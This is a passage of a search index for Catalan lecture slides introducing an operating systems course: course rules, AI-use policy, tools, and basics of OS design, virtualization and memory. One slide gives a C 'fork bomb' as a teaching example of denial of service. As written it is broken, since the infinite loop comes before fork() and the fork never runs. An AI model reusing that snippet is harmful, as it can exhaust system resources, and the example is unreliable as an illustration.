    "text": "Bonus 1\n\n\n\nObjectiu: Fomentar la reflexió i l’autoavaluació dels continguts treballats a classe.\nMetodologia: Cada setmana, els estudiants han de fer un commit al seu repositori d’apunts amb les notes de les sessions de teoria i pràctiques.\nAvaluació: Es valorarà la qualitat de les notes, la seva coherència i la seva relació amb els continguts treballats, així com les reflexions i opinions personals incloses.\nPer participar cal crear un repositori a Github (públic) i fer-me arribar l’enllaç.\n\n\n\n\nExemple de Notes\n## Setmana X\n\n# Resum teòric\n\n# Exemples pràctics\n\n# Dubtes i preguntes\n\n# Reflexions personals\n\n\n\n\n\n\n\nNo es permet cap altre forma\n\n\nLes notes han de ser escrites en format Markdown i mantingudes en un repositori Git i Github.\n\n\n\n\n\n\nAquest bonus està dissenyat per incentivar els estudiants a mantenir un registre organitzat i reflexiu dels continguts treballats a classe. En fer un commit setmanal amb les seves notes, els estudiants no només reforcen el seu aprenentatge, sinó que també desenvolupen habilitats de documentació i autoavaluació. La qualitat de les notes serà clau en l’avaluació, ja que es valorarà no només la precisió dels continguts, sinó també la capacitat de reflexionar sobre el que s’ha après i com s’ha aplicat aquest coneixement. Es tracta d’una oportinitat per als estudiants per crear el seu diari d’aprenentatge al llarg del curs. Per participar, els estudiants han de crear un repositori públic a Github i compartir l’enllaç amb el professorat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bonus-2",
    "href": "slides/01-introduction.html#bonus-2",
    "title": "Introducció",
    "section": "Bonus 2",
    "text": "Bonus 2\n\n\n\nEls materials són Open Source.\nQualsevol estudiant pot detectar errors, millorar els materials o afegir continguts nous.\nS’avaluarà la quantitat i qualitat.\n\n\n\n\n\nUn altre bonus que oferim és la possibilitat de contribuir als materials de l’assignatura seguint la metodologia de Open Source. Això significa que qualsevol estudiant pot detectar errors, suggerir millores o afegir continguts nous als materials proporcionats. Per participar, els estudiants poden fer un fork del repositori de l’assignatura, treballar en una branca separada i després obrir una pull request amb les seves propostes de canvi. La quantitat i qualitat de les contribucions seran avaluades, oferint així una oportunitat per als estudiants de participar activament en la millora dels recursos educatius.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#gestió-del-curs",
    "href": "slides/01-introduction.html#gestió-del-curs",
    "title": "Introducció",
    "section": "Gestió del curs",
    "text": "Gestió del curs\n\nEs demana que els estudiants arribin puntuals a les sessions. L’entrada tardana pot interrompre la dinàmica de la classe i el treball dels companys.\nEs demana que els estudiants respectin les normes de convivència i respecte mutu durant les sessions de classe. Això inclou evitar interrupcions innecessàries, escoltar activament als companys i al professor, i mantenir un ambient de treball positiu i constructiu.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#comunicació-amb-el-professorat",
    "href": "slides/01-introduction.html#comunicació-amb-el-professorat",
    "title": "Introducció",
    "section": "Comunicació amb el professorat",
    "text": "Comunicació amb el professorat\n\nIntenteu comunicar-vos a través del correu electrònic i no per l’eina del campus virtual per assegurar una resposta més ràpida.\nLes sessions de tutoria es realitzaran de manera presencial o virtual, segons les necessitats dels estudiants. És important que els estudiants sol·licitin cita prèvia per a les tutories utilitzant el correu electrònic jordi.mateo@udl.cat indicant el motiu de la consulta i la disponibilitat horària i afegint l’assumpte [SO]: Sol·licitud de Tutoria.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#treball-individual",
    "href": "slides/01-introduction.html#treball-individual",
    "title": "Introducció",
    "section": "Treball individual",
    "text": "Treball individual\n\nCada estudiant és responsable de la seva pròpia feina i de com gestiona el seu temps.\nL’assistència a classe no és obligatòria.\nCada alumne ha de presentar evidències pròpies del treball realitzat, encara que es col·labori en grup.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#ús-de-la-iag",
    "href": "slides/01-introduction.html#ús-de-la-iag",
    "title": "Introducció",
    "section": "Ús de la IAG",
    "text": "Ús de la IAG\n\nPots utilitzar eines d’IAG per generar idees, entendre conceptes complexos o esbossar l’estructura inicial del teu codi o projecte. No obstant això, la implementació i la versió final han de ser sempre de la teva autoria.\nEstà estrictament prohibit presentar codi o solucions generades directament per una IAG com a treball propi (és a dir, mitjançant un simple copiar i enganxar).\nSi incorpores material assistit per una IAG, has de declarar-ho explícitament. Això implica identificar clarament les seccions generades per IAG i proporcionar el prompt exacte utilitzat per crear-les.\n\n\nL’incompliment d’aquestes directrius es considerarà una violació de la integritat acadèmica.\n\n\nQualificació de zero en la tasca.\nConseqüències disciplinàries que estableix la Normativa de Convivència de la UdL per frau acadèmic.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#eines-necessàries",
    "href": "slides/01-introduction.html#eines-necessàries",
    "title": "Introducció",
    "section": "Eines necessàries",
    "text": "Eines necessàries\n\nOrdinador portàtil amb connexió a Internet.\n\nEs recomana portar el vostre propi ordinador per cursar l’assignatura.\nSi no disposeu d’ordinador, podreu utilitzar els ordinadors de la classe durant les sessions de laboratori.\n\nDistribucions Linux (Debian )\n\nÉs obligatori utilitzar la distribució Debian per a les pràctiques de laboratori.\n\nSoftware de virtualització (VMWare)\n\nEs recomana utilitzar VMWare, però podeu optar per altres opcions de virtualització. Heu de ser capaços d’adaptar el material al vostre programari de virtualització.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#programari-necessari",
    "href": "slides/01-introduction.html#programari-necessari",
    "title": "Introducció",
    "section": "Programari necessari",
    "text": "Programari necessari\nLlenguatges de programació i compiladors\n\nC\nGCC\n\nEines de control de versions\n\nGit\nGithub\n\nIDE\n\nVisual Studio (Recomanat)\nVi, Vim, NeoVim, Emacs, CLion, Eclipse …",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#materials-i-recursos",
    "href": "slides/01-introduction.html#materials-i-recursos",
    "title": "Introducció",
    "section": "Materials i Recursos",
    "text": "Materials i Recursos\n\nApunts de l’assignatura i materials proporcionats pel professor.\nDocumentació oficial de les eines i tecnologies utilitzades.\nFòrums tècnics a la xarxa com Stack Overflow, Reddit, etc.\nLlibres de referència en Sistemes Operatius:\n\nOperating System Concepts; Abraham Silberschatz\nModern Operating Systems; Andrew S. Tanenbaum",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bones-pràctiques",
    "href": "slides/01-introduction.html#bones-pràctiques",
    "title": "Introducció",
    "section": "Bones pràctiques",
    "text": "Bones pràctiques\n\nDRY (Do not repeat yourself).\nCodi fàcil de reutilitzar.\nTesteja aviat, testeja sovint, testeja de forma automàtica.\nNo assumeixis res, prova-ho.\nUtilitza assertions per prevenir l’impossible.\nUtilitza excepcions per problemes excepcionals.\nEstima l’ordre de complexitat dels teus algorismes.\nUtilitza patrons de disseny.\nUtilitza eines de control de versions.\n\n\nDurant el curs, us animaré a seguir aquestes bones pràctiques de programació per assegurar que el vostre codi sigui net, eficient i fàcil de mantenir. Aquestes pràctiques no només us ajudaran a desenvolupar millor programari, sinó que també us prepararan per treballar en equips de desenvolupament professionals on aquestes normes són estàndard. Es important que el vostre codi sigui fàcil de llegir i entendre per altres persones, inclòs el vostre jo futur!",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bibliografia-recomanada",
    "href": "slides/01-introduction.html#bibliografia-recomanada",
    "title": "Introducció",
    "section": "Bibliografia recomanada",
    "text": "Bibliografia recomanada\n(per la vida… no pel curs)\n\n\nThe Pragmatic Programmer, Andrew Hunt David Thomas\n\n\n\n\nUs aconsello molt aquests dos llibres. Són llibres que no només us ajudaran en aquest curs, sinó que també us seran útils al llarg de tota la vostra carrera com a desenvolupadors de programari. Aquests llibres ofereixen consells pràctics i principis fonamentals que us ajudaran a escriure codi utiltizant bones pràctiques. Són dos llibres que tot programador hauria de llegir almenys un cop a la vida.\n\nClean Code, (A Handbook of Agile Software Craftsmanship),Robert C. Martin",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#societat-actual",
    "href": "slides/01-introduction.html#societat-actual",
    "title": "Introducció",
    "section": "Societat actual",
    "text": "Societat actual\n\n\nQuè tenen en comú?\n\nCotxe\nRellotge\nPortàtil\nRentadora\nNevera\nTelevisió\n…\n\nVivim en un gran sistema paral·lel i distribuït!\n\n\n\n\n\n\nPer començar, m’agradaria que reflexionéssiu sobre què tenen en comú tots aquests dispositius que fem servir en el nostre dia a dia. Des de cotxes fins a rellotges, portàtils, tauletes, rentadores, neveres i televisors, tots aquests aparells semblen molt diferents entre si. Però si mirem més a fons, veurem que tots compartixen dos característiques fonamentals: tots són dispositius electrònics que interactuen amb nosaltres i tots estan connectats a internet. Aquesta connexió a internet és el que els permet comunicar-se entre si i amb nosaltres. Això ens porta a la següent reflexió: vivim en un món on tot està interconnectat, podem dir que vivim en un món distribuït on tots aquests dispositius treballen junts per fer-nos la vida més fàcil i eficient.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#món-connectat",
    "href": "slides/01-introduction.html#món-connectat",
    "title": "Introducció",
    "section": "Món connectat",
    "text": "Món connectat\n\nAvui en dia tothom parla de IoT, BigData, Cloud, AI, Blockchain, Metavers\n\n\n\n\nMicroprocessador a tot arreu.\nXarxes i Connectivitat.\nServeis escalables, confiables i segurs.\nGran volum de dades, Sensor i Digitalització.\n\n\n\n\n\nCasa connectada (Font: Extret de SemanticScholar)\n\n\n\n\nLa barrera que separa el món físic i el món virtual cada cop es mes estreta.\n\n\nEn la societat actual es parla constatant de noves tecnologies disruptives com IoT, BigData, Cloud, AI, Blockchain, Metavers,… Per tant, com a societat tenim la capacitat d’interactuar amb el nostre entorn i ambient. Això implica que tenim microprocessadors a tot arreu, disposem de xarxes i connectivitat que ens permeten estar sempre connectats, podem accedir a serveis escalables, confiables i segurs, i gestionem un gran volum de dades gràcies a la digitalització i els sensors.\nAra, pensem un moment en el nostre dia a dia: - Quants teniu un cotxe? Quants processadors creieu que té un cotxe? - Més de 50! - Qui utilitza un smartphone? Quants processadors/cores té el vostre smartphone? - El meu un Poco X4 GT té un MediaTek Dimensity 8100 amb 8 nuclis.\nLa capacitat de computació està present a tot arreu, i la majoria dels dispositius que utilitzem diàriament estan equipats amb microprocessadors que funcionen de manera paral·lela i interactuen entre ells. Per tant, el món físic i el món virtual estan cada cop més interconnectats, i la barrera que els separa es fa cada cop més estreta.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-tenen-en-comú-1",
    "href": "slides/01-introduction.html#què-tenen-en-comú-1",
    "title": "Introducció",
    "section": "Què tenen en comú?",
    "text": "Què tenen en comú?\n\nUna interfície (Sistema Operatiu) capaç d’integrar una gran diversitat de maquinari i programari i comunicar-se a través de la xarxa.\n\n\n\n\n\nPerò, que tenen en comú aquests progressos tecnològics? Requereixen un cervell que permeti a tots els diferents aparells i màquines interactua amb nosaltres, tant per generar, processar o guardar. Tots els dispositius i servidors requereixen un sistema operatiu que permeti maquinari i programari comunicar-se.\nEn aquest curs tractarem els cervells d’aquests sistemes i analitzarem de quines estructures podem dotar aquests sistemes perquè funcionin correctament i permeti que maquinari tan heterogeni sigui capaç de fer funcionar infinitat de programes i serveis per gestionar eficientment les dades i la informació del nostre entorn.\nPer tant, a la pregunta inicial què tenen en comú? podem afirmar:\n\nTenen en comú que tots són sistemes informàtics.\nTots tenen un sistema operatiu.\nTots es communiquen per internet amb altres sistemes.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#llei-de-bell",
    "href": "slides/01-introduction.html#llei-de-bell",
    "title": "Introducció",
    "section": "Llei de Bell",
    "text": "Llei de Bell\n\n\n\n\nEs pot observar com la mida i les classes de computadors han evolucionat cada 10 anys. Venim de la dècada dels anys 60 i 70, on es van desenvolupar els primers microprocessadors i la informàtica personal estava en les seves primeres etapes. En aquesta època, es feien servir pocs processadors que eren compartits per moltes persones. Els avanços en la capacitat de processament eren més lents, i la tecnologia era més limitada. Ara, en l’actualitat, cada persona fa servir molts processadors de manera habitual. Això es deu a l’augment de la potència de processament dels dispositius que utilitzem, com els telèfons intel·ligents i les tauletes, així com als ordinadors personals i altres tecnologies. Venim de pocs processadors fets servir per a moltes persones (anys 60-70) i ara cada persona fa servir molts processadors. Com ha canviat la tendència… on ens portarà el futur?",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#llei-de-moore",
    "href": "slides/01-introduction.html#llei-de-moore",
    "title": "Introducció",
    "section": "Llei de Moore",
    "text": "Llei de Moore\n\n\n\n\nUs recordeu la llei de Moore? Aquesta llei, formulada per Gordon Moore el 1965, predia que el nombre de transistors en un microprocessador es duplicaria aproximadament cada dos anys, cosa que implicava un augment exponencial de la potència de càlcul dels ordinadors. Aquesta predicció s’ha mantingut sorprenentment precisa durant dècades, impulsant avanços tecnològics i transformant la manera com vivim i treballem. No obstant això, a mesura que ens acostem als límits físics de la miniaturització dels transistors, hi ha un debat continu sobre si aquesta tendència continuarà en el futur o si necessitarem noves tecnologies per mantenir el ritme d’innovació.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-és-un-sistema-informàtic",
    "href": "slides/01-introduction.html#què-és-un-sistema-informàtic",
    "title": "Introducció",
    "section": "Què és un sistema informàtic?",
    "text": "Què és un sistema informàtic?\nUn sistema informàtic és la interconnexió d’elements de maquinari per exemple d’1 o més CPU, memòria i components E/S … Amb la finalitat d’executar programes i accions (en sèrie o de forma concurrent) per 1 o múltiples usuaris.\n\n\n\n\n\n\n\nSi us recordeu d’Estructura de Computadors, un sistema informàtic és la interconnexió d’elements de maquinari com ara una o més CPU, memòria i components d’entrada/sortida. Tenim els registres, la memòria cau, la memòria principal, els dispositius d’entrada/sortida i els canals de comunicació que permeten que tots aquests components treballin junts per executar programes i accions.\nCom heu vist el mon real actua com un gran sistema paral·lel. Per tant, tots els sistemes de temps real son inherentment concurrents i lògicament els nostres sisteme informàtics també han de poder actuar en paral·lel. En la figura, podeu observar com una tasca es descomposa en diferents parts per poder aprofitar els diferents processadors i nuclis de cada processador.L’execució concurrent recull un conjunt de tècniques informàtiques usades per representar i gestionar el paral·lelisme i les eines de sincronització i comunicació entre programes.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#gestió-dun-sistema-informàtic-i",
    "href": "slides/01-introduction.html#gestió-dun-sistema-informàtic-i",
    "title": "Introducció",
    "section": "Gestió d’un sistema informàtic (I)",
    "text": "Gestió d’un sistema informàtic (I)\n\nImagineu que sou un sistema informàtic i us envien l’ordre de llegir un fitxer\n\n\nQuin és el procediment per fer aquesta acció?\n\nEngegar motor del disc.\nBuscar posició al disc a llegir (pista, cara, sector).\nLlegir.\nApagar el motor.\n\nQuantes vegades com a usuaris d’un sistema informàtic llegiu un fitxer?\n\n\nMoltes vegades…!\n\n\nCom a usuaris d’un sistema informàtic llegim fitxers moltes vegades al dia. Per exemple, quan obrim un document de text, una imatge, un vídeo o qualsevol altre tipus d’arxiu, el sistema operatiu ha de llegir aquest fitxer des del disc dur o una altra unitat d’emmagatzematge. Però, us heu preguntat alguna vegada quin és el procediment que segueix el sistema informàtic per llegir aquest fitxer? Hauriam d’engegar el motor del disc, buscar la posició correcta al disc on es troba el fitxer, llegir les dades i finalment apagar el motor. Té sentit que un usuari cada cop que llegeix un fitxer hagi de tenir en compte aquest procediment i realitzar-lo de forma rutinària? Necessitem un programari que ens permeti efectuar accions rutinàries de forma automàtica i transparent a l’usuari. Si no els sistemes informàtics no serien usables.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#complexitat-sistemes-informàtics-i",
    "href": "slides/01-introduction.html#complexitat-sistemes-informàtics-i",
    "title": "Introducció",
    "section": "Complexitat sistemes informàtics (I)",
    "text": "Complexitat sistemes informàtics (I)\n\nCada peça de hardware és diferent. \\(\\Rightarrow\\) La complexitat per gestionar els recursos és molt elevada.\n\n\nArquitectures diferents de processadors i també de generacions (x86, ARM, RISC-V, MIPS, PowerPC,…).\nDiferents tipus de memòries (RAM DDR3, DDR4, DDR5, NAND,…).\nDiferents tipus de discs (HDD, SSD, NVM…).\nDiferents dispositius entrada/sortida.\nDiferents entorns de xarxa.\n\n\n… entre moltes altres …\n\n\nUs imagineu haver d’escriure software per cada permutació d’elements diferents del sistema informàtic? Això seria un desastre… Quantes permutacions de diferents components podem tenir avui en dia? OMG! Necessitem alguna cosa que ens permeti superar aquest obstacle de forma intel·ligent i ens permeti desenvolupar software de forma independent al hardware.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#complexitat-sistemes-informàtics-iii",
    "href": "slides/01-introduction.html#complexitat-sistemes-informàtics-iii",
    "title": "Introducció",
    "section": "Complexitat sistemes informàtics (III)",
    "text": "Complexitat sistemes informàtics (III)\nTots els programes necessiten accedir a tot el hardware?\n\nPer suposat que no! Això podria causar problemes de seguretat com:\n\nPèrdua de confidencialitat: Accés no autoritzat a dades sensibles.\nAccés a informació restringida: Usuaris no autoritzats podrien veure dades privades.\nDenegació de serveis: Un programa podria bloquejar l’accés a recursos per a altres programes.\n\n\n\nQuè pot passar si un programa pot accedir a tota la RAM?\n\n\nUn programa de l’usuari Jordi amb accés a tota la RAM podria veure les dades del programa de l’usuari Pere.\nSi el programa falla, podria afectar tot el sistema i requerir un reinici.\n\n\nNo, clar que no! Seguretat: - Si un programa controla tot el sistema, els altres no poden accedir-hi (Denegació de serveis). - Diferents usuaris poden tenir diferents dades; si un programa pot accedir a tot, podria veure informació restringida. - No necessitem accés a tot el hardware per realitzar les nostres tasques. - Un usuari malintencionat podria danyar el sistema amb un procés defectuós.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#complexitat-sistemes-informàtics-iv",
    "href": "slides/01-introduction.html#complexitat-sistemes-informàtics-iv",
    "title": "Introducció",
    "section": "Complexitat sistemes informàtics (IV)",
    "text": "Complexitat sistemes informàtics (IV)\nSi un sistema informàtic no està ben dissenyat, un programa mal escrit pot fer fallar tot el sistema, per exemple:\nBucle infinit\nint main(){\n    while(1);\n}\nFork bomb\nint main(){\n    while(1);\n    fork();\n}\n\nUn programa o procés pot fer fallar tot el sistema si no està ben dissenyat. Per tant, és important tenir en compte aquelles situacions per evitar-les. En el primer exemple, tenim un bucle infinit. Aquesta situació en els sistemes linux actuals no és un problema, ja que el sistema operatiu pot gestionar aquest tipus de situacions. No obstant això, en sistemes més antics, aquest tipus de bucles podrien fer que el sistema no respongués. En el segon exemple, tenim un bucle infinit i una crida a la funció fork(). Aquesta funció crea un nou procés que és una còpia exacta del procés pare. Això podria fer que el sistema es saturés amb molts processos i no pogués respondre. Aquesta situació podria requerir un reinici del sistema per recuperar-lo i es un problema en els sistemes actuals. Fixeu-vos com un simple programa pot fer fallar tot el sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-és-un-sistema-operatiu",
    "href": "slides/01-introduction.html#què-és-un-sistema-operatiu",
    "title": "Introducció",
    "section": "Què és un sistema operatiu?",
    "text": "Què és un sistema operatiu?\nUn sistema operatiu (SO) és una capa de software que permet la comunicació i la gestió del maquinari habilitant als usuaris l’execució de programes. El SO actua d’intermediari (interfície) entre els usuaris i el maquinari.\n\n\nUn sistema operatiu (SO) és una capa de software que permet la comunicació i la gestió del maquinari habilitant als usuaris l’execució de programes. El SO actua d’intermediari (interfície) entre els usuaris i el maquinari.\nPer tant, és un programa que controla el maquinari i permet als usuaris interactuar amb ell. Aquesta interacció pot ser a través d’una interfície gràfica d’usuari (GUI) o una interfície de línia de comandes (CLI). També, gestiona els recursos del sistema, com la memòria, el disc dur i els dispositius d’entrada/sortida. A més, el SO proporciona funcionalitats com la gestió de fitxers, la seguretat i la xarxa.\nPodem dir que el SO és el cervell del sistema informàtic,ja que controla tots els components i permet als usuaris interactuar amb ells. Sense un SO, els usuaris no podrien utilitzar el maquinari del sistema de manera eficient i segura.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-volen-els-programadors",
    "href": "slides/01-introduction.html#què-volen-els-programadors",
    "title": "Introducció",
    "section": "Què volen els programadors?",
    "text": "Què volen els programadors?\n\n\nUna plataforma…\n\nper executar aplicacions.\ntransparent per evitar la complexitat del hardware.\neficient per utilitzar els recursos de forma òptima.\nportable per utilitzar-ho indepedentment del hardware.\n\n\n\n\n\nDes del punt de vista dels programadors, el que volen és una plataforma per executar les seves aplicacions. Aquesta plataforma ha de ser transparent per evitar la complexitat del hardware, eficient per utilitzar els recursos de forma òptima i portable per utilitzar-ho indepedentment del hardware.El kernel és la capa intermèdia que connecta el programari de l’usuari amb el maquinari físic de l’ordinador. A la imatge es pot veure com el kernel actua com un pont entre l’aplicació i el maquinari. Quan un programador escriu una aplicació, no necessita preocupar-se per com funciona el maquinari a nivell de circuits. En canvi, pot utilitzar les funcions proporcionades pel kernel per interactuar amb el maquinari de manera més senzilla i eficient. Els usuaris finals també es beneficien d’aquesta abstracció, ja que poden utilitzar aplicacions sense necessitat de conèixer els detalls tècnics del maquinari. El kernel permet que el mateix codi pugui funcionar en diferents ordinadors amb maquinari diferent. Un programador pot escriure una aplicació (com un navegador web) una sola vegada, i el kernel s’encarregarà de traduir les seves instruccions per al maquinari específic de cada màquina. També gestiona de manera eficient els recursos del sistema, com el temps de processador, l’ús de la memòria o l’accés al disc.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-ofereix-el-sistema-operatiu",
    "href": "slides/01-introduction.html#què-ofereix-el-sistema-operatiu",
    "title": "Introducció",
    "section": "Què ofereix el sistema operatiu?",
    "text": "Què ofereix el sistema operatiu?\n\n\nServeis\n\nControlar/Gestionar usuaris i aplicacions.\nGestionar la Memòria.\nSistema de fitxers.\nPlanificadors.\nEines de xarxa.\n\n\nGaranties\n\nSeguretat.\nTransparència.\nEficiència.\nPortabilitat.\nEstabilitat al llarg del temps.\n\n\n\n\n\n\nObserveu que el kernel ens ofereix una interfície d’usuari amb serveis com el sistema de fitxers, la gestió de la memòria, la planificació de processos i les eines de xarxa. I per sota d’aquestes capes, tenim els drivers que ens permeten interactuar amb el maquinari físic de l’ordinador.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#com-sorganitza-el-sistema-operatiu",
    "href": "slides/01-introduction.html#com-sorganitza-el-sistema-operatiu",
    "title": "Introducció",
    "section": "Com s’organitza el sistema operatiu?",
    "text": "Com s’organitza el sistema operatiu?\n\n\n\n\n\n\nMaquina virtual\nÉs la visió que té l’usuari del sistema operatiu durant una sessió de treball.\n\nDualitat\nEl sistema operatiu divideix el programari que té tots els privilegis(kernel) del programari que no pot accedir a tots els recursos (programes, llibreries, intèrpret de comandes,…).\n\n\n\nAquest concepte descriu la visió que tenim nosaltres, els usuaris, del sistema. Quan treballem amb un ordinador, veiem una interfície amigable: icones, finestres, aplicacions. Aquesta és la màquina virtual que el sistema operatiu ens crea. És una capa abstracta que simplifica les tasques complexes del maquinari i ens permet centrar-nos en el nostre treball. Penseu-hi com una il·lusió: l’OS ens amaga la complexitat del maquinari i ens mostra una versió simplificada, fàcil de gestionar.\nSota aquesta interfície amigable hi ha un principi de seguretat fonamental. El sistema operatiu divideix el programari en dos grans grups per qüestions de seguretat i estabilitat. El nucli del sistema operatiu, amb accés total al maquinari, i és responsable de la gestió de recursos. Penseu-hi com el cervell de l’ordinador, que pren totes les decisions importants. La resta de programari, com les aplicacions que utilitzem diàriament, té accés limitat als recursos del sistema. Durant una sessió de treball, el sistema operatiu canvia entre aquests dos modes segons sigui necessari.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-és-una-màquina-virtual",
    "href": "slides/01-introduction.html#què-és-una-màquina-virtual",
    "title": "Introducció",
    "section": "Què és una Màquina Virtual?",
    "text": "Què és una Màquina Virtual?\nLa virtualització presentar una visió abstracta dels recursos del sistema. Diversos processos creuen (tenen l’il·lusió) de disposar sempre d’un conjunt de recursos (màquinaria).\n\nSimplicitat Il·lusió de propietat de recursos\nAïllament Els bugs es donen en un entorn virtual i no físic.\nProtecció Els processos no es poden fer mal entre ells.\nPortabilitat Podem executar a totes les plataformes.\n\n\nImagineu-vos que organitzem una LAN-party amb assistents, però només hi ha 1 pizza per alimentar-los. Com podem mostrar a cada un el seu propi tros de pizza i mantenir-los compromesos amb el nostre esdeveniment. Fàcil, creem 1 pizza virtual basada en la pizza real i donem a cada encarregat un tros de pizza virtual. Però, aquí ve un problema si tots els assistents mengen la pizza alhora, no funcionarà, alguns participants notarien el truc. Tanmateix, si programem els esdeveniments perquè molts participants s’ocupin de les activitats i no mengin la pizza, els organitzadors poden intercanviar en temps real la pizza real i la virtual a les taules on els participants descansen, perquè són els únics candidats a menjar i descobrir el truc, així que Si mengen, la pizza ha de ser real.Java té un sandbox que permet utilitzar el Java independentment d’on executem.VirtualBox i VMWare ens permeten executar sistemes operatius dins de sistemes operatius. Tenim un sistema operatiu amfitrió (màquina física) i un o més sistemes operatius virtuals (hostes).També és possible virtualitzar sobre el hardware sense la necessitat d’un sistema operatiu (amfitrió).També tenim virtualització per contenidors (Docker).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#models-de-virtualització-dalt-nivell",
    "href": "slides/01-introduction.html#models-de-virtualització-dalt-nivell",
    "title": "Introducció",
    "section": "Models de Virtualització d’alt nivell",
    "text": "Models de Virtualització d’alt nivell\n\n\n\nVirtualització Nativa: Hipervisor s’executa directament sobre el maquinari físic sense cap sistema operatiu intermedi. Exemples d’aquesta tecnologia inclouen VMware ESXi o Microsoft Hyper-V. Això ofereix un rendiment molt elevat, ja que no hi ha cap capa addicional entre el maquinari i l’hipervisor, ideal per a entorns de producció.\nVirtualització Allotjada: Hipervisor s’executa sobre un sistema operatiu ja existent. Per exemple, en KVM, s’utilitza Linux com a sistema operatiu base, i sobre aquest es creen les màquines virtuals.\nParavirtualització: El sistema operatiu convidat sap que està sent virtualitzat i coopera amb l’hipervisor per millorar el rendiment. Un exemple destacat és Xen, que és molt utilitzat en entorns cloud per la seva eficiència.\nVirtualització Assistida per Hardware: Aquest model aprofita les capacitats del processador per accelerar el procés de virtualització. Processadors moderns com els d’Intel (VT-x) o AMD (AMD-V) ofereixen suport per a aquest tipus de virtualització (VMware o Hyper-V).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#què-és-la-memòria-virtual",
    "href": "slides/01-introduction.html#què-és-la-memòria-virtual",
    "title": "Introducció",
    "section": "Què és la Memòria Virtual?",
    "text": "Què és la Memòria Virtual?\n\nLa memòria virtual permet que cada procés tingui la il·lusió que té accés exclusiu a l’espai complet d’adreces de memòria del processador.\nEn realitat els processos utilitzen diferents regions de la memòria de l’ordinador, amb algunes regions traslladades al disc si no hi ha prou memòria per a tothom.\n\n\nLa unitat de gestió de memòria (MMU) d’un processador, que tradueix les adreces virtuals utilitzades pel programa en adreces físiques que representen ubicacions de memòria reals.\n\n\nUn exemple de virtualització és la memòria virtual. La memòria virtual és una tècnica que permet als sistemes operatius utilitzar la memòria de manera més eficient i segura. Aquesta tècnica crea una il·lusió per als processos que els fa creure que tenen accés exclusiu a l’espai complet d’adreces de memòria del processador. En realitat, els processos utilitzen diferents regions de la memòria de l’ordinador, amb algunes regions traslladades al disc si no hi ha prou memòria per a tothom. Aquesta tècnica permet que els processos s’executin de manera aïllada, evitant que un procés pugui accedir a la memòria d’un altre procés. Això és important per garantir la seguretat i la estabilitat del sistema. La unitat de gestió de memòria (MMU) d’un processador és la responsable de traduir les adreces virtuals utilitzades pel programa en adreces físiques que representen ubicacions de memòria reals. Aquesta traducció es fa mitjançant taules de pàgines que mapejen les adreces virtuals a les adreces físiques. Aquest procés l’estudiarem més endavant en detall.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#quins-són-els-rols-so-i",
    "href": "slides/01-introduction.html#quins-són-els-rols-so-i",
    "title": "Introducció",
    "section": "Quins són els rols SO? (I)",
